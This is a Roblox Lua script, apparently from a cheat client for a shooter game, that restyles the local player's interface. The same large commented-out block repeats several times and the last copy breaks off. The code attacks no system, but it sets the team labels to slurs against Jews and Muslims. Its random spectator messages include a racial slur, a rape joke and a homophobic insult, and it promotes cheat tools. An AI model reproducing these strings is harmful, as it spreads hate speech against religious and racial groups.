	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

